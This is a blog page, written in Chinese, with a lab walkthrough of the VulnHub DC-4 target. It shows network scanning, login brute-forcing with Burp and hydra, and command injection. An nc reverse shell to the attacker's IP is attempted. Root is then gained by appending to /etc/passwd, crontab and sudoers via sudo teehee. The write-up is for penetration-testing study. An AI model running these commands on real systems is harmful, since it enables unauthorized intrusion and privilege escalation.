@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>VulnHub_DC-4靶机渗透测试学习 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub_DC-4靶机渗透测试学习</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">2020-06-30&nbsp;&nbsp;9:47:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>DC-3</code>靶机只有一个entry point，就是根据<code>CVE-2018-8917</code>sql注入漏洞获得管理员密码，登录后台后植入webshell：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/1.png" alt="1"></p>
+<p>但是<code>DC-4</code>靶机应该是有比较多的解法的：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/2.png" alt="2"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>第一步永远是收集目标主机的信息，直接上nmap：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sP 192.168.247.1/24</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-28 11:09 EDT</span><br><span class="line">Nmap scan report for 192.168.247.1</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Nmap scan report for 192.168.247.2</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Nmap scan report for 192.168.247.210</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">Nmap scan report for 192.168.247.217</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.45 seconds</span><br></pre></td></tr></table></figure>
+
+<p>发现目标主机<code>192.168.247.217</code>，继续扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -p1-65535 -A 192.168.247.217 -oN /tmp/DC-4.txt</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-28 11:09 EDT</span><br><span class="line">Nmap scan report for 192.168.247.217</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>因为目标主机开启了http服务，访问该站点：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/3.png" alt="3"></p>
+<p>是一个简单的登陆界面。尝试了普通密码之后没能成功登录。</p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>那扫描一下目录，发现了<code>command.php</code>：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/4.png" alt="4"></p>
+<p>但是要访问这个页面还是需要登录，那直接上burp爆破用户名和密码。</p>
+<h3 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h3><h4 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h4><p>这里的字典我用了github上一个知名的字典库<a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists</a> ：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/10.png" alt="10"></p>
+<p>burp抓下包，发送到<strong>Intruder</strong>模块，选择需要爆破的字段为<code>username</code>和<code>password</code>，<strong>attack type</strong>选择为<code>Cluster bomb</code>：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/5.png" alt="5"></p>
+<p>usernames用了字典：<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt</a></p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/6.png" alt="6"></p>
+<p>passwords用了字典：<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top1000.txt</a></p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/7.png" alt="7"></p>
+<p>然后设置线程为<code>20</code>后就可以开始爆破了：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/8.png" alt="8"></p>
+<p>大概两分钟之后就可以看到爆破成功了：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/9.png" alt="9"></p>
+<p>得到用户密码为<code>admin : happy</code>。</p>
+<h4 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h4><p>除了burp之外，还可以用hydra进行爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.247.217 -V -L tools&#x2F;top-usernames-shortlist.txt -P &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-small.txt http-post-form &quot;&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;logout&quot; | grep password</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/18.png" alt="18"></p>
+<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>登入之后访问<code>command.php</code>，可以看到：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/11.png" alt="11"></p>
+<p>burp抓个包，修改一下命令，尝试反弹shell：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.247.210 4444</span><br></pre></td></tr></table></figure>
+
+<p>但是不知道为什么，反弹shell始终不成功，郁闷，还没找到原因：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/13.png" alt="13"></p>
+<p>换个思路，先读取<code>/etc/passwd</code>文件：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/12.png" alt="12"></p>
+<p>发现目标主机上有3个用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">charles:x:1001:1001:Charles,,,:&#x2F;home&#x2F;charles:&#x2F;bin&#x2F;bash</span><br><span class="line">jim:x:1002:1002:Jim,,,:&#x2F;home&#x2F;jim:&#x2F;bin&#x2F;bash</span><br><span class="line">sam:x:1003:1003:Sam,,,:&#x2F;home&#x2F;sam:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>查看一下目标主机下的<code>/home</code>目录发现了三个文件夹：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">total 20</span><br><span class="line">drwxr-xr-x  5 root    root    4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 21 root    root    4096 Apr  5  2019 ..</span><br><span class="line">drwxr-xr-x  2 charles charles 4096 Apr  7  2019 charles</span><br><span class="line">drwxr-xr-x  3 jim     jim     4096 Apr  7  2019 jim</span><br><span class="line">drwxr-xr-x  2 sam     sam     4096 Apr  7  2019 sam</span><br></pre></td></tr></table></figure>
+
+<p>但是只有<code>/home/jim</code>下有文件存在：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/14.png" alt="14"></p>
+<p><code>backups</code>是一个文件夹，该文件夹下存在一个<code>.bak</code>文件<code>old-passwords.bak</code>，这个可能就是<code>jim</code>用户登录的关键，读取该文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radio&#x3D;cat+&#x2F;home&#x2F;jim&#x2F;backups&#x2F;old-passwords.bak</span><br></pre></td></tr></table></figure>
+
+<p>然后保存为<code>jim_passwords.txt</code>，用<code>hydra</code>进行爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P jim_password.txt ssh:&#x2F;&#x2F;192.168.247.217</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/15.png" alt="15"></p>
+<p>得到密码<code>jibril04</code>。</p>
+<p>登录之后，接下去的目标就是提权啦，所以先看一下有没有可以用sudo运行的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ sudo -l</span><br><span class="line">[sudo] password for jim: </span><br><span class="line">Sorry, user jim may not run sudo on dc-4.</span><br></pre></td></tr></table></figure>
+
+<p>但是很遗憾，用户jim并不在sudo组中。之前也说过，<code>/home/jim</code>下存在一个文件<code>mbox</code>，读取之后发现是一封邮件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:~$ cat mbox </span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure>
+
+<p>说真的，到了这里，我的思路又断了，这是啥意思，看了别人的wp之后才知道可以查看<code>/var/mail</code>邮件目录，发现有一封邮件<code>jim</code>，打开之后发现发信人是<code>charles</code>，并且在邮件中给了<code>jim</code>自己的用户登录密码<code>^xHhA&amp;hvim0y</code>，防止在他度假的时候有什么问题<code>jim</code>可以登录他的账号查看：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/16.png" alt="16"></p>
+<p>登录charles账户后，查看哪些命令可以sudo执行：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/17.png" alt="17"></p>
+<p>有一个命令<code>/usr/bin/teehee</code>，这个命令可以将一些input写入指定的文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ teehee --help</span><br><span class="line">Usage: teehee [OPTION]... [FILE]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br><span class="line">  -i, --ignore-interrupts   ignore interrupt signals</span><br><span class="line">  -p                        diagnose errors writing to non pipes</span><br><span class="line">      --output-error[&#x3D;MODE]   set behavior on write error.  See MODE below</span><br><span class="line">      --help     display this help and exit</span><br><span class="line">      --version  output version information and exit</span><br><span class="line"></span><br><span class="line">MODE determines behavior with write errors on the outputs:</span><br><span class="line">  &#39;warn&#39;         diagnose errors writing to any output</span><br><span class="line">  &#39;warn-nopipe&#39;  diagnose errors writing to any output not a pipe</span><br><span class="line">  &#39;exit&#39;         exit on error writing to any output</span><br><span class="line">  &#39;exit-nopipe&#39;  exit on error writing to any output not a pipe</span><br><span class="line">The default MODE for the -p option is &#39;warn-nopipe&#39;.</span><br><span class="line">The default operation when --output-error is not specified, is to</span><br><span class="line">exit immediately on error writing to a pipe, and diagnose errors</span><br><span class="line">writing to non pipe outputs.</span><br><span class="line"></span><br><span class="line">GNU coreutils online help: &lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;coreutils&#x2F;&gt;</span><br><span class="line">Full documentation at: &lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;coreutils&#x2F;tee&gt;</span><br><span class="line">or available locally via: info &#39;(coreutils) tee invocation&#39;</span><br></pre></td></tr></table></figure>
+
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>那最后一步就是提权了。到这里为止有三个思路，通过修改以下三个文件中的任意一个实现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure>
+
+<h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p><code>/etc/passwd</code>是系统中很重要的文件，是用来保存用户的账户信息的，这个文件中的账户都是按照格式存储的，存储格式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册名:口令:用户标识号:组标识号:用户名:用户主目录:命令解释程序</span><br></pre></td></tr></table></figure>
+
+<p>如果用户有密码，那么口令这个字段就是用一个<code>x</code>表示，然后第3个字段是用户标识号，就是UID，root用户的UID就是<code>0</code>，第4个字段是组标识号GID，root的GID也是<code>0</code>，最后一个字段就是用户登录时运行的shell。</p>
+<p>那么通过往<code>/etc/passwd</code>文件中添加一行数据，就可以添加一个用户账号，但是这个文件是只有root用户才可以修改的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al &#x2F;etc&#x2F;passwd</span><br><span class="line">-rw-r--r-- 1 root root 1578 Apr  7  2019 &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>既然<code>teehee</code>命令拥有sudo权限，也就是说，可以通过<code>teehee</code>命令向<code>/etc/passwd</code>文件中添加一行数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bt::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/19.png" alt="19"></p>
+<p>接着登录root权限用户<code>bt</code>，就可以看到当前的权限是<code>root</code>了！</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/20.png" alt="20"></p>
+<h4 id="etc-crontab"><a href="#etc-crontab" class="headerlink" title="/etc/crontab"></a>/etc/crontab</h4><p><code>/etc/crontab</code>是系统性的计划任务，由<code>cron</code>命令来执行。<code>cron</code>是linux内置计划任务服务，<code>crond</code>是该服务的进程名称，<code>crond</code>进程会每分钟定期检查<code>/etc/crontab</code>中是否有要执行的任务。</p>
+<p><code>/etc/crontab</code>文件的格式是这样的：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/22.png" alt="22"></p>
+<p>可以看到，格式是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一部分 * * * * *：表示任务的执行周期和时间，*表示任意时间</span><br><span class="line">第二部分：表示执行任务时的用户</span><br><span class="line">第三部分：需要执行的命令</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以这样利用这个文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;* * * * * root chmod 4777 &#x2F;bin&#x2F;sh&quot; | sudo teehee -a &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line">echo &quot;* *    * * *   root    root chmod 4777 &#x2F;bin&#x2F;sh&quot; | sudo teehee -a &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>* * * * *</code>表示每时每刻都让root用户执行后面的命令<code>chmod 4777 /bin/bash</code>：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/23.png" alt="23"></p>
+<h4 id="etc-sudoers"><a href="#etc-sudoers" class="headerlink" title="/etc/sudoers"></a>/etc/sudoers</h4><p>当用户执行sudo命令时，系统会根据<code>/etc/sudoers</code>文件来判断当前用户是否具有执行该sudo命令的权限。</p>
+<p>这个文件的格式为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useralias(用户名) hostalias(可以从哪些机器登录)&#x3D;(用户:用户组) cmdalias(执行什么命令)</span><br></pre></td></tr></table></figure>
+
+<p>所以可以利用<code>teehee</code>命令修改这个文件，赋予<code>cahrles</code>用户执行所有命令的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;charles ALL&#x3D;(ALL:ALL) ALL&quot; | sudo teehee -a &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure>
+
+<p>现在charles用户就可以以root身份执行所有命令了：</p>
+<p><img src="/2020/06/30/VulnHub_DC-4/imgs/21.png" alt="21"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机其实和真实环境可能有一点的距离，因为这不是一个真实的cms，而且在获得jim用户名那里更加偏向于ctf类型，毕竟很少有人会将自己用过的密码直接放在文件中，但是从中学到的提权方法还是很有趣的，之前在另一个靶机已经学过利用suid提权了，只不过利用的命令不同，不过最重要的还是拓宽思路。所以对我来说，这个靶机最好的练习点还是在前期的爆破用户名和密码，以及后面的suid提权部分。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/06/30/VulnHub_DC-4/">https://bantttian.github.io/2020/06/30/VulnHub_DC-4/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/06/27/VulnHub_DC-3/">VulnHub_DC-3靶机渗透测试学习</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
